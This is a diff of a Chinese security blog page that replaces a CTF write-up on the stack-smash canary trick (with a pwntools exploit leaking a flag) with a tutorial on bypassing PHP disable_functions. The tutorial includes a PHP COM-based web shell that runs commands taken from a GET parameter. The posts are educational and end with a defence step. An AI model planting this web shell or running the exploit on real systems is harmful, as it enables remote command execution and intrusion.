@@ -15,27 +15,23 @@
 
 
 
-<meta name="description" content="已完结.">
-<meta name="keywords" content="二进制,栈溢出,Pwn">
+<meta name="description" content="未完待续...">
+<meta name="keywords" content="Web安全,PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="花式栈溢出之Stack smash">
-<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/index.html">
+<meta property="og:title" content="浅谈几种Bypass disable_functions的方法">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/index.html">
 <meta property="og:site_name" content="Mi1k7ea">
-<meta property="og:description" content="已完结.">
+<meta property="og:description" content="未完待续...">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/1.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/2.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/3.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/4.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/6.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/5.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/8.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/7.png">
-<meta property="og:updated_time" content="2019-05-28T14:19:56.975Z">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/4.png">
+<meta property="og:updated_time" content="2019-06-02T15:55:45.945Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="花式栈溢出之Stack smash">
-<meta name="twitter:description" content="已完结.">
-<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/1.png">
+<meta name="twitter:title" content="浅谈几种Bypass disable_functions的方法">
+<meta name="twitter:description" content="未完待续...">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/1.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -67,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>花式栈溢出之Stack smash | Mi1k7ea</title>
+<title>浅谈几种Bypass disable_functions的方法 | Mi1k7ea</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -257,11 +253,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-花式栈溢出之Stack-smash" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-浅谈几种Bypass-disable-functions的方法" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/23/花式栈溢出之Stack-smash/" class="article-date">
-      <time datetime="2019-03-23T15:06:00.000Z" itemprop="datePublished">2019-03-23</time>
+      <a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/" class="article-date">
+      <time datetime="2019-06-02T10:07:10.000Z" itemprop="datePublished">2019-06-02</time>
 </a>
 
 
@@ -276,7 +272,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      花式栈溢出之Stack smash
+      浅谈几种Bypass disable_functions的方法
     </h1>
   
 
@@ -285,13 +281,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+    <a class="article-category-link" href="/categories/PHP/">PHP</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出/">栈溢出</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -301,41 +297,33 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><blockquote>
-<p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下：</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p>
-</blockquote>
-<h2 id="EKOPARTY-PRE-CTF-2015-Smashing-the-stack-for-fun-and-profit"><a href="#EKOPARTY-PRE-CTF-2015-Smashing-the-stack-for-fun-and-profit" class="headerlink" title="EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit"></a>EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit</h2><p>这里结合ekoparty-pre-ctf-2015的一道Pwn题来学习，<a href="https://github.com/ctfs/write-ups-2015/blob/master/ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/pwn100.zip" target="_blank" rel="noopener">题目下载地址</a>。</p>
-<p>在本地运行前，需要在本地先建立一个flag.txt。</p>
-<p>运行程序，先给个有趣的地址，然后给你输入用户名；file查看是静态链接文件；checksec发现开启了NX和Canary：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/1.png" alt=""></p>
-<p>IDA看下main()函数，程序会打开本地的flag.txt文件，然后复制该文件描述符到一个buf中，接着输出一个指向该buf的地址并询问你的用户名，通过read()函数获取0x400长度的用户输入的内容，而0x400数值过大，由此可知read()函数存在栈溢出漏洞：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/2.png" alt=""></p>
-<p>这样看应该是直接给了获取flag的地址了。</p>
-<p>回到之前安全编译选项检测的结果发现，程序是开了Canary的，根据Canary的原理，其在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置，如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail()函数将抛出异常并退出程序。</p>
-<p>先试下发送大量字符，查看到抛出异常信息，即调用了Canary实现代码中的__libc_message()将__libc_argv[0]打印了出来，这里__libc_argv[0]为本程序名，同时发现程序只是终止了而非栈溢出时的段错误：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/3.png" alt=""></p>
-<p>也就是说，只要溢出的内容覆盖了Canary插入的cookie，Canary就会报错，且当前输入200个字符还未达到覆盖到argv[0]的位置。整个栈结构及溢出原理如下图所示：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/4.png" alt=""></p>
-<p>下面只需要确定溢出的变量地址距离argv[0]的偏移地址。</p>
-<p><strong>Method1——使用pattern</strong></p>
-<p>之前pattern_create生成的200个字符串并未使程序出现段错误，后面尝试到400个字符串时发生段错误，没有输出Canary出错返回的异常信息而是输出Segmentation fault，即输入字符溢出覆盖了argv[0]地址导致程序无法正常读取该值从而发生错误：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/6.png" alt=""></p>
-<p>pattern_offset得到偏移量为376：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/5.png" alt=""></p>
-<p><strong>Method2——断点调试</strong></p>
-<p>先在main()函数打断点，运行：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/8.png" alt=""></p>
-<p>可以看出0x7fffffffe2bd保存的是程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x7fffffffdf48处保留着该地址，所以我们真正需要覆盖的地址是0x7fffffffdf48。</p>
-<p>此时RBP的地址为0x7fffffffde60；在前面IDA中可以看到变量v8相对于RBP的偏移量为90h，因此可算出v8变量的地址为RBP-90h=0x7fffffffddd0。</p>
-<p>最后可以算出v8变量到需要覆盖的地址的偏移量为：|0x7fffffffddd0 - 0x7fffffffdf48|=178h=376(d)</p>
-<p>编写payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./xpl"</span>)</span><br><span class="line">addr = int(sh.recvline().split()[<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">376</span>, p64(addr)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">result = sh.recvall()</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
-<p>运行getflag：</p>
-<p><img src="/2019/03/23/花式栈溢出之Stack-smash/7.png" alt=""></p>
+        <p>Bypass disable_functions的方法有很多，这里先将一些常用的方法小结一下，后面会继续补充各种方法。</p>
+<h2 id="0x01-disable-functions"><a href="#0x01-disable-functions" class="headerlink" title="0x01 disable_functions"></a>0x01 disable_functions</h2><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。</p>
+<p>我们查看phpinfo的时候，会发现有这么一栏，我本地这里默认是未设置的：</p>
+<p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/1.png" alt=""></p>
+<p>要更改的话打开php.ini，找到对应的行修改即可，这里修改如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; This directive allows you to disable certain functions for security reasons.</span></span><br><span class="line"><span class="comment">; It receives a comma-delimited list of function names.</span></span><br><span class="line"><span class="comment">; http://php.net/disable-functions</span></span><br><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure>
+<p>注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。</p>
+<p>然后重启服务，在phpinfo中可以看到已经生效：</p>
+<p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/2.png" alt=""></p>
+<p>下面就逐一对各种方法进行简单的归纳。</p>
+<h2 id="0x02-黑名单绕过"><a href="#0x02-黑名单绕过" class="headerlink" title="0x02 黑名单绕过"></a>0x02 黑名单绕过</h2><p>我们知道，disable_functions其实是一个黑名单机制，我们可以通过观察是否存在可利用的漏网之鱼，直接通过其实现绕过即可。</p>
+<p>……</p>
+<h2 id="0x03-利用Windows系统组件COM绕过"><a href="#0x03-利用Windows系统组件COM绕过" class="headerlink" title="0x03 利用Windows系统组件COM绕过"></a>0x03 利用Windows系统组件COM绕过</h2><p>Windows系统组件COM在Windows默认就存在，是位于System32目录下的wshom.ocx文件。</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>先在php.ini中查看是否已经开启com.allow_dcom，若未开启则将前面的;分号去掉：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; allow Distributed-COM calls</span></span><br><span class="line"><span class="comment">; http://php.net/com.allow-dcom</span></span><br><span class="line">com.allow_dcom = true</span><br></pre></td></tr></table></figure>
+<p>然后在php/ext/里面查找是否存在php_com_dotnet.dll这个文件。</p>
+<p>再到php.ini中查看是否存在extension=php_com_dotnet.dll这项，有的话去掉注释开启，否则直接添加上去即可。</p>
+<p>重启服务，在phpinfo中查看是否开启了：</p>
+<p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/3.png" alt=""></p>
+<h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>前提通过phpinfo知道disable_functions选项如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">disable_functions</span> = exec,system,passthru,shell_exec,proc_open,popen,dl,</span><br></pre></td></tr></table></figure>
+<p>此时在Web服务器中写入任意的以上函数的WebShell都是无法执行命令的。</p>
+<p>上传comshell.php至Web服务器中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过COM组件实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制：</p>
+<p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/4.png" alt=""></p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>彻底的解决方案是直接删除System32目录下wshom.ocx文件。</p>
 
       
     </div>
@@ -344,13 +332,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></p>
+        <p><span>本文标题:</span><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mi1k7ea</a></p>
-        <p><span>发布时间:</span>2019-03-23, 23:06:00</p>
-        <p><span>最后更新:</span>2019-05-28, 22:19:56</p>
+        <p><span>发布时间:</span>2019-06-02, 18:07:10</p>
+        <p><span>最后更新:</span>2019-06-02, 23:55:45</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/23/花式栈溢出之Stack-smash/" title="花式栈溢出之Stack smash">https://Mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/" title="浅谈几种Bypass disable_functions的方法">https://Mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -362,16 +350,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/24/C编写实现Linux反弹shell/">
-                    C编写实现Linux反弹shell
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/22/图片XSS小结/">
-                    图片XSS小结
+                <a href="/2019/06/02/浅析Python-Flask-SSTI/">
+                    浅析Python Flask SSTI
                 </a>
             </div>
         
@@ -383,7 +365,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-smash"><span class="toc-number">1.</span> <span class="toc-text">Stack smash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EKOPARTY-PRE-CTF-2015-Smashing-the-stack-for-fun-and-profit"><span class="toc-number">2.</span> <span class="toc-text">EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-disable-functions"><span class="toc-number">1.</span> <span class="toc-text">0x01 disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-黑名单绕过"><span class="toc-number">2.</span> <span class="toc-text">0x02 黑名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用Windows系统组件COM绕过"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用Windows系统组件COM绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境配置"><span class="toc-number">3.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">3.2.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-number">3.3.</span> <span class="toc-text">防御方法</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -419,7 +401,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"花式栈溢出之Stack smash　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"浅谈几种Bypass disable_functions的方法　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -439,15 +421,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/24/C编写实现Linux反弹shell/" title="上一篇: C编写实现Linux反弹shell">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/22/图片XSS小结/" title="下一篇: 图片XSS小结">
+            <a href="/2019/06/02/浅析Python-Flask-SSTI/" title="下一篇: 浅析Python Flask SSTI">
                 <i class="fa fa-angle-right"></i>
             </a>
         
